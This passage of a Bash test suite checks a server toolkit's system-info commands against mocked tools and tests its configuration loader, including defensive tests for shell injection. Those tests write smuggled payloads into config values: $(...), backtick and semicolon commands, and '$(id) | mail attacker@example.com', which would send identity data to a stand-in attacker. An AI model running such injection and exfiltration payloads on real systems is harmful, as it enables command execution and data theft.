STUB_PATH="${STUB_DIR}:${PATH}"

if PATH="$STUB_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_info_nogpu.out 2>/tmp/toolkit_test_info_nogpu.err; then
    if grep -A2 '^GPU$' /tmp/toolkit_test_info_nogpu.out | grep -q 'N/A'; then
        ok "info reports GPU: N/A when nvidia-smi is unavailable"
    else
        bad "info did not report GPU: N/A when nvidia-smi was unavailable"
    fi
else
    bad "info failed when nvidia-smi was mocked unavailable: $(cat /tmp/toolkit_test_info_nogpu.err)"
fi

if PATH="$STUB_PATH" "${BIN_DIR}/gpu-info" >/tmp/toolkit_test_gpu_nogpu.out 2>/tmp/toolkit_test_gpu_nogpu.err; then
    if grep -q 'GPU: N/A' /tmp/toolkit_test_gpu_nogpu.out; then
        ok "gpu-info reports GPU: N/A when nvidia-smi is unavailable"
    else
        bad "gpu-info did not print GPU: N/A when nvidia-smi was unavailable"
    fi
else
    bad "gpu-info failed when nvidia-smi was mocked unavailable: $(cat /tmp/toolkit_test_gpu_nogpu.err)"
fi
rm -rf "$STUB_DIR"

echo "== info works with docker mocked unavailable =="
# Prepend a stub directory whose docker always fails, simulating an
# unreachable Docker daemon.
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/docker"
chmod +x "${STUB_DIR}/docker"
STUB_PATH="${STUB_DIR}:${PATH}"

if PATH="$STUB_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_info_nodocker.out 2>/tmp/toolkit_test_info_nodocker.err; then
    if grep -q 'unavailable' /tmp/toolkit_test_info_nodocker.out; then
        ok "info reports Docker unavailable and still exits 0"
    else
        bad "info did not report docker as unavailable"
    fi
    if grep -qi 'Docker daemon is unavailable' /tmp/toolkit_test_info_nodocker.out; then
        ok "info raises an alert for unavailable Docker daemon"
    else
        bad "info did not raise an alert for unavailable Docker daemon"
    fi
else
    bad "info failed when docker was mocked unavailable: $(cat /tmp/toolkit_test_info_nodocker.err)"
fi

echo "== docker-info handles Docker unavailable =="
if PATH="$STUB_PATH" "${BIN_DIR}/docker-info" >/tmp/toolkit_test_dockerinfo_nodocker.out 2>/tmp/toolkit_test_dockerinfo_nodocker.err; then
    if grep -qi 'unavailable' /tmp/toolkit_test_dockerinfo_nodocker.out && \
       grep -qi 'Docker daemon unavailable' /tmp/toolkit_test_dockerinfo_nodocker.out; then
        ok "docker-info reports Docker unavailable, alerts, and still exits 0"
    else
        bad "docker-info did not report/alert on unavailable Docker daemon"
    fi
else
    bad "docker-info failed when docker was mocked unavailable: $(cat /tmp/toolkit_test_dockerinfo_nodocker.err)"
fi
rm -rf "$STUB_DIR"

echo "== docker-info handles zero containers (mocked) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/docker" <<'MOCKEOF'
#!/usr/bin/env bash
# Minimal scripted `docker` for docker-info tests. Behavior selected by
# $DOCKER_MOCK_SCENARIO: "zero" (no containers) or "unhealthy" (one healthy,
# one unhealthy container).
scenario="${DOCKER_MOCK_SCENARIO:-zero}"

case "$1" in
    info)
        if [[ "${2:-}" == "--format" ]]; then
            case "$scenario" in
                zero) printf '{"ContainersRunning":0,"Containers":0,"Images":0}\n' ;;
                unhealthy) printf '{"ContainersRunning":2,"Containers":2,"Images":1}\n' ;;
            esac
        fi
        ;;
    version)
        printf '0.0.0-mock\n'
        ;;
    compose)
        [[ "${2:-}" == "version" ]] && printf '0.0.0-mock\n'
        ;;
    ps)
        [[ "$scenario" == "zero" ]] && exit 0
        case "${2:-}" in
            -aq) printf 'aaa111\nbbb222\n' ;;
            -a) printf 'svc-good|Up 1 hour (healthy)\nsvc-bad|Up 1 hour (unhealthy)\n' ;;
        esac
        ;;
    inspect)
        if [[ "$scenario" == "unhealthy" ]]; then
            printf '/svc-good|0|healthy\n/svc-bad|0|unhealthy\n'
        fi
        ;;
    stats)
        if [[ "$scenario" == "unhealthy" ]]; then
            printf 'svc-good\t0.1%%\t10MiB / 100MiB\t10.0%%\n'
            printf 'svc-bad\t0.1%%\t10MiB / 100MiB\t10.0%%\n'
        fi
        ;;
    system)
        if [[ "${2:-}" == "df" ]]; then
            printf '{"Type":"Images","Size":"10MB","Reclaimable":"0B (0%%)","TotalCount":"1","Active":"1"}\n'
            printf '{"Type":"Containers","Size":"1MB","Reclaimable":"0B (0%%)","TotalCount":"0","Active":"0"}\n'
            printf '{"Type":"Local Volumes","Size":"1MB","Reclaimable":"0B (0%%)","TotalCount":"0","Active":"0"}\n'
            printf '{"Type":"Build Cache","Size":"0B","Reclaimable":"0B","TotalCount":"0","Active":"0"}\n'
        fi
        ;;
    network)
        case "${2:-}" in
            ls) printf 'netid1\n' ;;
            inspect) printf 'mock-net|bridge|0\n' ;;
        esac
        ;;
    volume)
        [[ "${2:-}" == "ls" ]] && printf 'mock-vol|local\n'
        ;;
    images)
        printf 'mock-image:latest|10MB\n'
        ;;
esac
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/docker"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if DOCKER_MOCK_SCENARIO=zero PATH="$MOCK_PATH" "${BIN_DIR}/docker-info" >/tmp/toolkit_test_dockerinfo_zero.out 2>/tmp/toolkit_test_dockerinfo_zero.err; then
    if grep -A2 '^CONTAINERS$' /tmp/toolkit_test_dockerinfo_zero.out | grep -q 'None'; then
        ok "docker-info shows 'None' for zero containers"
    else
        bad "docker-info did not show 'None' in CONTAINERS with zero containers"
    fi
    if grep -A2 '^RESTARTS$' /tmp/toolkit_test_dockerinfo_zero.out | grep -q 'None'; then
        ok "docker-info shows 'None' restarts with zero containers"
    else
        bad "docker-info did not show 'None' in RESTARTS with zero containers"
    fi
else
    bad "docker-info failed with zero containers: $(cat /tmp/toolkit_test_dockerinfo_zero.err)"
fi

echo "== docker-info handles containers without healthchecks (mocked) =="
if DOCKER_MOCK_SCENARIO=unhealthy PATH="$MOCK_PATH" "${BIN_DIR}/docker-info" >/tmp/toolkit_test_dockerinfo_unhealthy.out 2>/tmp/toolkit_test_dockerinfo_unhealthy.err; then
    ok "docker-info exits 0 with a mocked unhealthy container present"
else
    bad "docker-info failed on unhealthy-container mock: $(cat /tmp/toolkit_test_dockerinfo_unhealthy.err)"
fi

echo "== docker-info handles unhealthy containers (mocked) =="
if grep -q 'svc-bad' /tmp/toolkit_test_dockerinfo_unhealthy.out && grep -q 'unhealthy' /tmp/toolkit_test_dockerinfo_unhealthy.out; then
    ok "docker-info lists the unhealthy container in CONTAINERS"
else
    bad "docker-info did not list the mocked unhealthy container"
fi
if grep -A5 '^HEALTH$' /tmp/toolkit_test_dockerinfo_unhealthy.out | grep -qE 'Unhealthy +1$'; then
    ok "docker-info HEALTH section reflects the unhealthy container"
else
    bad "docker-info HEALTH section missing unhealthy count"
fi
if grep -A5 '^ALERTS$' /tmp/toolkit_test_dockerinfo_unhealthy.out | grep -qi 'unhealthy'; then
    ok "docker-info raises an alert for the unhealthy container"
else
    bad "docker-info did not alert on the unhealthy container"
fi
rm -rf "$MOCK_DIR"

echo "== network-info handles no default route (mocked) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/ip" <<'MOCKEOF'
#!/usr/bin/env bash
# Mock `ip` for the "no default route" test: delegates everything to the
# real ip binary except `route show default`, forced empty when
# NETWORK_MOCK_NO_ROUTE=1, so no actual routing state is touched.
if [[ "${NETWORK_MOCK_NO_ROUTE:-}" == "1" ]] && [[ "$*" == *"route show default"* ]]; then
    printf '[]\n'
    exit 0
fi
exec "${REAL_IP}" "$@"
MOCKEOF
chmod +x "${MOCK_DIR}/ip"

if REAL_IP="$(command -v ip)" NETWORK_MOCK_NO_ROUTE=1 PATH="${MOCK_DIR}:${PATH}" \
    "${BIN_DIR}/network-info" >/tmp/toolkit_test_network_noroute.out 2>/tmp/toolkit_test_network_noroute.err; then
    if grep -qE '^Default route +FAIL$' /tmp/toolkit_test_network_noroute.out; then
        ok "network-info reports Default route: FAIL with no default route"
    else
        bad "network-info did not report Default route: FAIL"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_network_noroute.out | grep -qi 'no default route'; then
        ok "network-info alerts on missing default route"
    else
        bad "network-info did not alert on missing default route"
    fi
else
    bad "network-info failed with no default route mocked: $(cat /tmp/toolkit_test_network_noroute.err)"
fi
rm -rf "$MOCK_DIR"

echo "== network-info handles DNS and external connectivity failures (mocked), distinctly =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/getent"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/ping"
chmod +x "${STUB_DIR}/getent" "${STUB_DIR}/ping"

if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/network-info" >/tmp/toolkit_test_network_noconn.out 2>/tmp/toolkit_test_network_noconn.err; then
    ok "network-info exits 0 with DNS and ping unavailable"
    if grep -qE '^Default route +OK$' /tmp/toolkit_test_network_noconn.out; then
        ok "network-info still reports Default route: OK (unaffected by DNS/ping failure)"
    else
        bad "network-info's default-route check was wrongly affected by DNS/ping failure"
    fi
    if grep -qE '^DNS +FAIL$' /tmp/toolkit_test_network_noconn.out; then
        ok "network-info reports DNS: FAIL"
    else
        bad "network-info did not report DNS: FAIL"
    fi
    if grep -qE '^Internet +FAIL$' /tmp/toolkit_test_network_noconn.out; then
        ok "network-info reports Internet: FAIL"
    else
        bad "network-info did not report Internet: FAIL"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_network_noconn.out | grep -qi 'DNS resolution failed' && \
       grep -A5 '^ALERTS$' /tmp/toolkit_test_network_noconn.out | grep -qi 'external connectivity check failed'; then
        ok "network-info raises distinct alerts for DNS failure and external connectivity failure"
    else
        bad "network-info did not raise distinct DNS/connectivity alerts"
    fi
else
    bad "network-info failed with DNS/ping mocked unavailable: $(cat /tmp/toolkit_test_network_noconn.err)"
fi
rm -rf "$STUB_DIR"

echo "== network-info listening-ports parsing works (mocked ss) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/ss" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `ss` for network-info tests. Behavior selected by
# $NETWORK_MOCK_SS_SCENARIO: "ports" (default) or "empty" (no sockets at all).
scenario="${NETWORK_MOCK_SS_SCENARIO:-ports}"
case "$*" in
    *-tlnp*)
        if [[ "$scenario" == "empty" ]]; then
            exit 0
        fi
        printf 'LISTEN 0      128        0.0.0.0:22    0.0.0.0:*\n'
        printf 'LISTEN 0      128        127.0.0.1:5432  0.0.0.0:*                                   users:(("postgres",pid=100,fd=5))\n'
        printf 'LISTEN 0      128             [::]:80       [::]:*\n'
        printf 'LISTEN 0      128            [::1]:25       [::]:*\n'
        ;;
    *-tan*)
        if [[ "$scenario" == "empty" ]]; then
            exit 0
        fi
        printf 'ESTAB      0      0             10.0.0.1:22          10.0.0.2:5000\n'
        printf 'LISTEN     0      0              0.0.0.0:22           0.0.0.0:*\n'
        printf 'TIME-WAIT  0      0             10.0.0.1:80          10.0.0.2:6000\n'
        ;;
esac
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/ss"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if NETWORK_MOCK_SS_SCENARIO=ports PATH="$MOCK_PATH" "${BIN_DIR}/network-info" >/tmp/toolkit_test_network_ports.out 2>/tmp/toolkit_test_network_ports.err; then
    if awk '/^PUBLIC$/,/^$/' /tmp/toolkit_test_network_ports.out | grep -qE '^0\.0\.0\.0 +22'; then
        ok "network-info categorizes 0.0.0.0 bind as PUBLIC"
    else
        bad "network-info did not list 0.0.0.0:22 under PUBLIC"
    fi
    if awk '/^LOCAL$/,0' /tmp/toolkit_test_network_ports.out | grep -qE '^127\.0\.0\.1 +5432 +postgres'; then
        ok "network-info categorizes 127.0.0.1 bind as LOCAL and extracts the process name"
    else
        bad "network-info did not list 127.0.0.1:5432 (postgres) under LOCAL"
    fi
    if grep -qE '^\[::1\] +25' /tmp/toolkit_test_network_ports.out; then
        ok "network-info preserves IPv6 loopback bind address"
    else
        bad "network-info did not show the [::1]:25 listener"
    fi
    if grep -qE '^LISTEN +1$' /tmp/toolkit_test_network_ports.out && grep -qE '^ESTABLISHED +1$' /tmp/toolkit_test_network_ports.out; then
        ok "network-info CONNECTIONS section summarizes mocked TCP states correctly"
    else
        bad "network-info CONNECTIONS section did not reflect the mocked states"
    fi
else
    bad "network-info failed with mocked ss ports data: $(cat /tmp/toolkit_test_network_ports.err)"
fi

echo "== network-info handles empty connection/listening sections without crashing =="
if NETWORK_MOCK_SS_SCENARIO=empty PATH="$MOCK_PATH" "${BIN_DIR}/network-info" >/tmp/toolkit_test_network_emptyss.out 2>/tmp/toolkit_test_network_emptyss.err; then
    ok "network-info exits 0 with no listening ports / no connections"
    if grep -A2 '^LISTENING PORTS$' /tmp/toolkit_test_network_emptyss.out | grep -q 'None'; then
        ok "network-info shows 'None' for empty LISTENING PORTS"
    else
        bad "network-info did not show 'None' for empty LISTENING PORTS"
    fi
    if grep -A2 '^CONNECTIONS$' /tmp/toolkit_test_network_emptyss.out | grep -q 'None'; then
        ok "network-info shows 'None' for empty CONNECTIONS"
    else
        bad "network-info did not show 'None' for empty CONNECTIONS"
    fi
else
    bad "network-info failed with empty ss output: $(cat /tmp/toolkit_test_network_emptyss.err)"
fi
rm -rf "$MOCK_DIR"

echo "== no background processes left running =="
sleep 1
leftover="$(pgrep -f 'docker stats --no-stream' 2>/dev/null || true)"
if [[ -z "$leftover" ]]; then
    ok "no lingering 'docker stats' processes"
else
    bad "found lingering docker stats process(es): $leftover"
fi
net_leftover="$(pgrep -f 'ping -c 1|ss -H -t' 2>/dev/null || true)"
if [[ -z "$net_leftover" ]]; then
    ok "no lingering ping/ss processes from network-info"
else
    bad "found lingering ping/ss process(es): $net_leftover"
fi

echo "== configuration engine: path resolution =="
default_path="$(env -u TOOLKIT_CONFIG_DIR -u XDG_CONFIG_HOME bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_path
')"
if [[ "$default_path" == "${HOME}/.config/server-toolkit/config" ]]; then
    ok "config_path defaults to \$HOME/.config/server-toolkit/config"
else
    bad "config_path default was '$default_path', expected '${HOME}/.config/server-toolkit/config'"
fi

override_path="$(TOOLKIT_CONFIG_DIR=/tmp/toolkit-config-override-test bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_path
')"
if [[ "$override_path" == "/tmp/toolkit-config-override-test/config" ]]; then
    ok "TOOLKIT_CONFIG_DIR overrides config_path"
else
    bad "TOOLKIT_CONFIG_DIR override did not take effect (got '$override_path')"
fi

echo "== configuration engine: validators =="
run_validator() {
    bash -c '
        source "'"${LIB_DIR}"'/config.sh"
        config_validate "'"$1"'" "'"$2"'" "'"${3:-}"'"
    '
}
run_validator "42" "integer" && ok "config_validate: 42 is a valid integer" || bad "config_validate: 42 rejected as integer"
run_validator "-3" "integer" && ok "config_validate: -3 is a valid integer" || bad "config_validate: -3 rejected as integer"
run_validator "abc" "integer" && bad "config_validate: 'abc' wrongly accepted as integer" || ok "config_validate: 'abc' rejected as integer"
run_validator "5" "positive_integer" && ok "config_validate: 5 is a valid positive_integer" || bad "config_validate: 5 rejected as positive_integer"
run_validator "0" "positive_integer" && bad "config_validate: 0 wrongly accepted as positive_integer" || ok "config_validate: 0 rejected as positive_integer"
run_validator "80" "percentage" && ok "config_validate: 80 is a valid percentage" || bad "config_validate: 80 rejected as percentage"
run_validator "150" "percentage" && bad "config_validate: 150 wrongly accepted as percentage" || ok "config_validate: 150 rejected as percentage"
run_validator "-1" "percentage" && bad "config_validate: -1 wrongly accepted as percentage" || ok "config_validate: -1 rejected as percentage"
run_validator "true" "boolean" && ok "config_validate: 'true' is a valid boolean" || bad "config_validate: 'true' rejected as boolean"
run_validator "false" "boolean" && ok "config_validate: 'false' is a valid boolean" || bad "config_validate: 'false' rejected as boolean"
run_validator "maybe" "boolean" && bad "config_validate: 'maybe' wrongly accepted as boolean" || ok "config_validate: 'maybe' rejected as boolean"
run_validator "yellow" "enum" "red|green|blue" && bad "config_validate: 'yellow' wrongly accepted by enum red|green|blue" || ok "config_validate: 'yellow' rejected by enum red|green|blue"
run_validator "green" "enum" "red|green|blue" && ok "config_validate: 'green' accepted by enum red|green|blue" || bad "config_validate: 'green' rejected by enum red|green|blue"
run_validator "hello" "string" && ok "config_validate: non-empty string accepted" || bad "config_validate: non-empty string rejected"
run_validator "" "string" && bad "config_validate: empty string wrongly accepted" || ok "config_validate: empty string rejected"

echo "== configuration engine: leading-zero numeric values are rejected (no silent octal reinterpretation) =="
run_validator "070" "percentage" && bad "config_validate: '070' wrongly accepted as percentage (leading zero)" || ok "config_validate: '070' rejected as percentage (leading zero)"
run_validator "080" "percentage" && bad "config_validate: '080' wrongly accepted as percentage (leading zero)" || ok "config_validate: '080' rejected as percentage (leading zero)"
run_validator "07" "positive_integer" && bad "config_validate: '07' wrongly accepted as positive_integer (leading zero)" || ok "config_validate: '07' rejected as positive_integer (leading zero)"
run_validator "-07" "integer" && bad "config_validate: '-07' wrongly accepted as integer (leading zero)" || ok "config_validate: '-07' rejected as integer (leading zero)"
run_validator "0" "integer" && ok "config_validate: bare '0' is still a valid integer" || bad "config_validate: bare '0' wrongly rejected as integer"
run_validator "0" "percentage" && ok "config_validate: bare '0' is still a valid percentage" || bad "config_validate: bare '0' wrongly rejected as percentage"

echo "== configuration engine: absent config uses defaults =="
CFG_TMP="$(mktemp -d)"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/nope" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
[[ "$result" == "90" ]] && ok "config_get returns the default (90) when no config file exists" \
    || bad "config_get did not fall back to default with no config file (got '$result')"

echo "== configuration engine: default behavior is identical whether TOOLKIT_CONFIG_DIR is unset or points nowhere =="
result_unset="$(env -u TOOLKIT_CONFIG_DIR bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
result_missing_dir="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/still-does-not-exist" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
if [[ "$result_unset" == "90" && "$result_missing_dir" == "90" ]]; then
    ok "config_get's default behavior is identical with TOOLKIT_CONFIG_DIR unset vs. pointing at a missing directory"
else
    bad "default behavior differs (unset='$result_unset', missing dir='$result_missing_dir')"
fi

echo "== configuration engine: valid config overrides default =="
mkdir -p "${CFG_TMP}/valid"
printf 'CONFIG_VERSION=1\nRAM_ALERT_PCT=80\n' > "${CFG_TMP}/valid/config"
chmod 600 "${CFG_TMP}/valid/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/valid" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
[[ "$result" == "80" ]] && ok "config_get returns the configured value (80) when the config sets it" \
    || bad "config_get did not pick up a valid config value (got '$result')"

echo "== configuration engine: invalid integer falls back to default with a warning =="
mkdir -p "${CFG_TMP}/badint"
printf 'TOP_N=notanumber\n' > "${CFG_TMP}/badint/config"
chmod 600 "${CFG_TMP}/badint/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/badint" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get TOP_N 5 positive_integer
' 2>"${CFG_TMP}/badint.err")"
if [[ "$result" == "5" ]] && grep -qi "invalid" "${CFG_TMP}/badint.err"; then
    ok "config_get falls back to default and warns on an invalid integer"
else
    bad "config_get did not handle an invalid integer correctly (got '$result', stderr: $(cat "${CFG_TMP}/badint.err"))"
fi

echo "== configuration engine: invalid percentage falls back to default =="
mkdir -p "${CFG_TMP}/badpct"
printf 'RAM_ALERT_PCT=150\n' > "${CFG_TMP}/badpct/config"
chmod 600 "${CFG_TMP}/badpct/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/badpct" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>/dev/null)"
[[ "$result" == "90" ]] && ok "config_get rejects an out-of-range percentage and uses the default" \
    || bad "config_get accepted an invalid percentage (got '$result')"

echo "== configuration engine: invalid boolean falls back to default =="
mkdir -p "${CFG_TMP}/badbool"
printf 'SOME_FLAG=maybe\n' > "${CFG_TMP}/badbool/config"
chmod 600 "${CFG_TMP}/badbool/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/badbool" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get SOME_FLAG false boolean
' 2>/dev/null)"
[[ "$result" == "false" ]] && ok "config_get rejects an invalid boolean and uses the default" \
    || bad "config_get accepted an invalid boolean (got '$result')"

echo "== configuration engine: unknown key is ignored, known keys still load =="
mkdir -p "${CFG_TMP}/unknown"
printf 'SOME_TOTALLY_UNKNOWN_SETTING=123\nRAM_ALERT_PCT=75\n' > "${CFG_TMP}/unknown/config"
chmod 600 "${CFG_TMP}/unknown/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/unknown" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
[[ "$result" == "75" ]] && ok "an unrecognized key does not stop other keys in the same config from loading" \
    || bad "unknown key handling broke loading of a known key (got '$result')"

echo "== configuration engine: duplicate key uses the last occurrence (deterministic) =="
mkdir -p "${CFG_TMP}/dup"
printf 'RAM_ALERT_PCT=60\nRAM_ALERT_PCT=85\n' > "${CFG_TMP}/dup/config"
chmod 600 "${CFG_TMP}/dup/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/dup" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
[[ "$result" == "85" ]] && ok "duplicate keys resolve deterministically to the last occurrence" \
    || bad "duplicate key resolution was not last-wins (got '$result')"

echo "== configuration engine: malformed lines are skipped without crashing =="
mkdir -p "${CFG_TMP}/malformed"
printf 'this is not valid\n=noKeyHere\n123STARTSWITHDIGIT=1\nRAM_ALERT_PCT=77\n' > "${CFG_TMP}/malformed/config"
chmod 600 "${CFG_TMP}/malformed/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/malformed" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>/dev/null)"
[[ "$result" == "77" ]] && ok "malformed lines are skipped, valid lines in the same file still load" \
    || bad "a malformed config line broke loading of the rest of the file (got '$result')"

echo "== configuration engine: supported config version loads normally =="
mkdir -p "${CFG_TMP}/goodver"
printf 'CONFIG_VERSION=1\nRAM_ALERT_PCT=82\n' > "${CFG_TMP}/goodver/config"
chmod 600 "${CFG_TMP}/goodver/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/goodver" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
')"
[[ "$result" == "82" ]] && ok "a config declaring the supported CONFIG_VERSION loads normally" \
    || bad "a supported CONFIG_VERSION unexpectedly failed to load (got '$result')"

echo "== configuration engine: unsupported config version is ignored entirely =="
mkdir -p "${CFG_TMP}/badver"
printf 'CONFIG_VERSION=99\nRAM_ALERT_PCT=82\n' > "${CFG_TMP}/badver/config"
chmod 600 "${CFG_TMP}/badver/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/badver" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>"${CFG_TMP}/badver.err")"
if [[ "$result" == "90" ]] && grep -qi "version" "${CFG_TMP}/badver.err"; then
    ok "an unsupported CONFIG_VERSION causes the whole config to be ignored, with a clear warning"
else
    bad "unsupported CONFIG_VERSION was not handled safely (got '$result', stderr: $(cat "${CFG_TMP}/badver.err"))"
fi

echo "== configuration engine: unreadable config falls back to defaults =="
mkdir -p "${CFG_TMP}/unreadable"
printf 'RAM_ALERT_PCT=77\n' > "${CFG_TMP}/unreadable/config"
chmod 000 "${CFG_TMP}/unreadable/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/unreadable" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>"${CFG_TMP}/unreadable.err")"
if [[ "$result" == "90" ]] && [[ -s "${CFG_TMP}/unreadable.err" ]]; then
    ok "an unreadable config file falls back to defaults with a clear message"
else
    bad "unreadable config was not handled safely (got '$result')"
fi
chmod 700 "${CFG_TMP}/unreadable/config"

echo "== configuration engine: world/group-writable config is rejected =="
mkdir -p "${CFG_TMP}/unsafe"
printf 'RAM_ALERT_PCT=77\n' > "${CFG_TMP}/unsafe/config"
chmod 666 "${CFG_TMP}/unsafe/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/unsafe" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>"${CFG_TMP}/unsafe.err")"
if [[ "$result" == "90" ]] && grep -qi "writable" "${CFG_TMP}/unsafe.err"; then
    ok "a world/group-writable config is rejected in favor of defaults"
else
    bad "an unsafe-permission config was not rejected (got '$result', stderr: $(cat "${CFG_TMP}/unsafe.err"))"
fi
chmod 600 "${CFG_TMP}/unsafe/config"

echo "== configuration engine: injected shell payloads are never executed =="
rm -f /tmp/config-pwned /tmp/config-pwned-backtick /tmp/config-pwned-semicolon
mkdir -p "${CFG_TMP}/injection"
cat > "${CFG_TMP}/injection/config" <<'EOF'
EVIL_SUBSHELL=$(touch /tmp/config-pwned)
EVIL_BACKTICK=`touch /tmp/config-pwned-backtick`
RAM_ALERT_PCT=90; touch /tmp/config-pwned-semicolon
EOF
chmod 600 "${CFG_TMP}/injection/config"
literal="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/injection" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get EVIL_SUBSHELL "" string
' 2>/dev/null)"
TOOLKIT_CONFIG_DIR="${CFG_TMP}/injection" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' >/dev/null 2>&1
if [[ ! -e /tmp/config-pwned && ! -e /tmp/config-pwned-backtick && ! -e /tmp/config-pwned-semicolon ]]; then
    ok "config loader never executes shell payloads embedded in values (\$(), backticks, ;)"
else
    bad "SECURITY: a config value was executed as a shell command (found: $(ls /tmp/config-pwned* 2>/dev/null))"
fi
if [[ "$literal" == '$(touch /tmp/config-pwned)' ]]; then
    ok "a \$(...) payload is stored and returned as inert literal text, not executed"
else
    bad "a \$(...) payload was not preserved as literal text (got '$literal')"
fi
rm -f /tmp/config-pwned /tmp/config-pwned-backtick /tmp/config-pwned-semicolon

echo "== configuration engine: pipe and background-execution payloads are never executed =="
mkdir -p "${CFG_TMP}/pipeamp"
PWNED_BG="${CFG_TMP}/pipeamp/pwned-bg"
{
    printf 'EVIL_PIPE=$(id) | mail attacker@example.com\n'
    printf 'EVIL_BG=touch %s &\n' "$PWNED_BG"
} > "${CFG_TMP}/pipeamp/config"
chmod 600 "${CFG_TMP}/pipeamp/config"
literal_pipe="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/pipeamp" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get EVIL_PIPE "" string
' 2>/dev/null)"
TOOLKIT_CONFIG_DIR="${CFG_TMP}/pipeamp" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get EVIL_BG "" string
' >/dev/null 2>&1
if [[ ! -e "$PWNED_BG" ]]; then
    ok "config loader never executes shell payloads embedded in values (|, &)"
else
    bad "SECURITY: a config value containing | or & was executed as a shell command (found: $PWNED_BG)"
fi
if [[ "$literal_pipe" == '$(id) | mail attacker@example.com' ]]; then
    ok "a value containing | and \$(...) is stored and returned as inert literal text, not executed"
else
    bad "a pipe/subshell payload was not preserved as literal text (got '$literal_pipe')"
fi

echo "== configuration engine: a value containing a literal tab survives the parser's own KEY<TAB>VALUE delimiter =="
mkdir -p "${CFG_TMP}/tabtest"
printf 'TABTEST=a\tb\n' > "${CFG_TMP}/tabtest/config"
chmod 600 "${CFG_TMP}/tabtest/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/tabtest" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get TABTEST "" string
' 2>/dev/null)"
if [[ "$result" == $'a\tb' ]]; then
    ok "a value containing a literal tab character round-trips intact (delimiter collision handled correctly)"
else
    bad "a value containing a literal tab was not preserved intact (got '$(printf '%q' "$result")')"
fi

echo "== configuration engine: an unterminated quote does not span lines (pinned, known limitation) =="
mkdir -p "${CFG_TMP}/multiline"
printf 'FOO="bar\nKEY2=malicious"\n' > "${CFG_TMP}/multiline/config"
chmod 600 "${CFG_TMP}/multiline/config"
result_foo="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/multiline" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get FOO "" string
' 2>/dev/null)"
result_key2="$(TOOLKIT_CONFIG_DIR="${CFG_TMP}/multiline" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get KEY2 "" string
' 2>/dev/null)"
if [[ "$result_foo" == '"bar' && "$result_key2" == 'malicious"' ]]; then
    ok "an unterminated quote does not span lines: FOO and KEY2 parse as two separate inert values"
else
    bad "unterminated-quote multi-line handling changed unexpectedly (FOO='$result_foo', KEY2='$result_key2')"
fi

rm -rf "$CFG_TMP"

echo "== configuration engine: info uses a configured RAM alert threshold =="
CFG_TMP2="$(mktemp -d)"
mkdir -p "${CFG_TMP2}/info-low"
printf 'RAM_ALERT_PCT=1\n' > "${CFG_TMP2}/info-low/config"
chmod 600 "${CFG_TMP2}/info-low/config"
